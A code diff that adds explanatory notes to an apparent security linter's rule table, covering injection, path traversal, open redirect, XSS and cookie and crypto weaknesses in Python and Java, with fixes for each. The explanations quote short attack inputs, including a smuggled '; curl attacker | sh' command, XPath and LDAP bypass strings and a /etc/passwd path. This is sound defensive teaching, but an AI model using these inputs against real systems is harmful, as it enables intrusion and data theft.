@@ -248,6 +248,122 @@ RULE_NOTES: tuple[RuleNote, ...] = (
         knowledge-base builder does.""",
     ),
     _note(
+        "PY016",
+        "Request data in a command given to a shell",
+        "Python",
+        """Passing a list to subprocess avoids the shell only when the list names the
+        program directly. A list that starts ["sh", "-c", ...] or ["cmd", "/c", ...]
+        hands its last element to a shell again, so a value from the request inside
+        it is parsed as shell syntax: "; curl attacker | sh" runs. If the first
+        element of the list comes from the request, the caller chooses which program
+        runs at all.""",
+        """Call the program you mean, with fixed arguments and the value as one
+        argument of its own: subprocess.run(["ping", "-c", "1", host], check=True).
+        Then validate the value against what it is allowed to be — a hostname
+        pattern, a list of known names — because many programs treat an argument
+        beginning with "-" as an option.""",
+    ),
+    _note(
+        "PY017",
+        "Request data used as a file path",
+        "Python",
+        """A file name taken from the request can contain "../" or be an absolute
+        path, so open(base + name) reads /etc/passwd, the application's own
+        configuration, or another user's upload. On a write, it overwrites code or
+        credentials. Checking that the name does not contain "../" is not enough on
+        its own: absolute paths, encoded separators and symbolic links get past it.""",
+        """Resolve the final path and confirm it is still inside the folder you meant:
+        target = (base / name).resolve(), then refuse unless
+        target.is_relative_to(base.resolve()). For uploads use
+        werkzeug.utils.secure_filename(name). Better still, do not accept a path at
+        all: accept an identifier and look the file up in a table of allowed ones.""",
+    ),
+    _note(
+        "PY018",
+        "Request data in an XPath expression",
+        "Python",
+        """An XPath expression built by joining text is parsed as XPath, so a value
+        such as ' or '1'='1 changes which nodes are selected. Where the query decides
+        who is logged in or what a user may read, that is an authentication bypass or
+        a disclosure of the whole document.""",
+        """Use XPath variables, which are passed as data and never parsed:
+        root.xpath("/users/user[@id=$id]", id=value) with lxml. Where the library has
+        no variables, validate the value against a strict pattern (digits only, a
+        fixed alphabet) before it reaches the expression.""",
+    ),
+    _note(
+        "PY019",
+        "Request data in an LDAP filter",
+        "Python",
+        """An LDAP filter is a small language: parentheses group conditions and * is a
+        wildcard. A value joined into (uid={name}) can be *)(objectClass=* and match
+        every entry, or close the filter and add a condition of the attacker's own —
+        which turns a lookup into a login bypass or a directory dump.""",
+        """Escape the value before it goes into the filter:
+        ldap3.utils.conv.escape_filter_chars(value) with ldap3, or
+        ldap.filter.escape_filter_chars(value) with python-ldap. Escape values that
+        become part of a distinguished name with the DN escaping function instead;
+        the two encodings are different.""",
+    ),
+    _note(
+        "PY020",
+        "Redirect to an address taken from the request",
+        "Python",
+        """A link to your site that ends in ?next=https://evil.example sends the
+        visitor to evil.example after they trust your domain in the address bar.
+        That is how a phishing page borrows a real site's reputation, and with OAuth
+        flows it can leak authorisation codes to the attacker's server.""",
+        """Redirect only to places on your own site. Build the address with url_for or
+        reverse, or accept a path and check it: Django's
+        url_has_allowed_host_and_scheme(url, allowed_hosts={request.get_host()}), or
+        in Flask parse it with urllib.parse.urlparse and require an empty netloc and
+        scheme. Fall back to a fixed page when the check fails.""",
+    ),
+    _note(
+        "PY021",
+        "Request data written into an HTML response",
+        "Python",
+        """A string returned from a Flask route is sent as an HTML page. If part of it
+        came from the request, a value such as <script>...</script> runs in the
+        visitor's browser with their session: it can read the page, send requests as
+        them and steal anything not marked HttpOnly. The link that triggers it only
+        has to be clicked.""",
+        """Render through a template, which escapes values by default:
+        render_template("hello.html", name=name). When building a string by hand,
+        escape each value with markupsafe.escape(value) or html.escape(value). Return
+        data as JSON with jsonify rather than as text when the caller is a script.
+        Do not pass request data to render_template_string or Markup.""",
+    ),
+    _note(
+        "PY022",
+        "Request data stored in the session without validation",
+        "Python",
+        """Code that reads the session treats what it finds as the server's own
+        record: who is logged in, what role they have, which step of a flow they
+        reached. Writing a value straight from the request into it lets the caller
+        choose those facts, and the mistake is invisible at the place where the
+        session is later trusted.""",
+        """Validate the value before it is stored, and store what the server
+        established rather than what the client said: look the user up and store
+        their id, not the name they typed. Where the value is a choice, check it
+        against the allowed choices first.""",
+    ),
+    _note(
+        "PY023",
+        "Cookie set with secure=False",
+        "Python",
+        """Without the Secure attribute a browser sends the cookie over plain HTTP as
+        well as HTTPS. Anyone on the network path — public Wi-Fi, a compromised
+        router — can read it from a single unencrypted request, and an attacker can
+        cause that request by getting the visitor to load an http:// address of the
+        site.""",
+        """Set secure=True, and for anything that identifies a session also
+        httponly=True and samesite="Lax":
+        response.set_cookie("session", value, secure=True, httponly=True,
+        samesite="Lax"). In Flask set SESSION_COOKIE_SECURE = True so the framework's
+        own cookie is covered too.""",
+    ),
+    _note(
         "JS001",
         "eval() on a value built at runtime",
         "JavaScript",
@@ -365,6 +481,47 @@ RULE_NOTES: tuple[RuleNote, ...] = (
         MessageDigest.getInstance("SHA-256"). For passwords use a password hash
         instead — javax.crypto's PBKDF2WithHmacSHA256 with a high iteration count, or
         Argon2 or bcrypt from a maintained library, each with a per-password salt.""",
+    ),
+    _note(
+        "JV004",
+        "Weak cipher or ECB mode",
+        "Java",
+        """DES has a 56-bit key and is broken by brute force in hours; RC4 leaks
+        plaintext through biases in its keystream; 3DES and Blowfish have a 64-bit
+        block, which repeats after a few gigabytes under one key. ECB mode encrypts
+        equal plaintext blocks to equal ciphertext blocks with any cipher, so the
+        structure of the data shows through the encryption.""",
+        """Use AES in an authenticated mode:
+        Cipher.getInstance("AES/GCM/NoPadding") with a 256-bit key from
+        KeyGenerator.getInstance("AES") and a fresh 12-byte nonce from SecureRandom
+        for every message. Store the nonce beside the ciphertext; it is not secret,
+        but it must never repeat under one key.""",
+    ),
+    _note(
+        "JV005",
+        "java.util.Random or Math.random() used near a security value",
+        "Java",
+        """java.util.Random is a linear congruential generator seeded from the clock:
+        two outputs are enough to recover its state and predict every later value.
+        A session id, a password-reset token or a one-time code made from it can be
+        computed by an attacker who has seen one of their own.""",
+        """Use java.security.SecureRandom: new SecureRandom().nextBytes(bytes), then
+        encode the bytes (Base64.getUrlEncoder().withoutPadding()). Create one
+        SecureRandom and reuse it. Keep java.util.Random for things nobody gains by
+        predicting — a shuffle in a game, jitter in a retry.""",
+    ),
+    _note(
+        "JV006",
+        "Cookie created with setSecure(false)",
+        "Java",
+        """Without the Secure attribute a browser sends the cookie over plain HTTP as
+        well as HTTPS, where anyone on the network path can read it. An attacker can
+        cause such a request by getting the visitor to load an http:// address of
+        the site.""",
+        """Call cookie.setSecure(true), and for a session cookie also
+        cookie.setHttpOnly(true). In a servlet container set
+        <cookie-config><secure>true</secure><http-only>true</http-only></cookie-config>
+        in web.xml so the container's own session cookie is covered.""",
     ),
     _note(
         "SQL001",
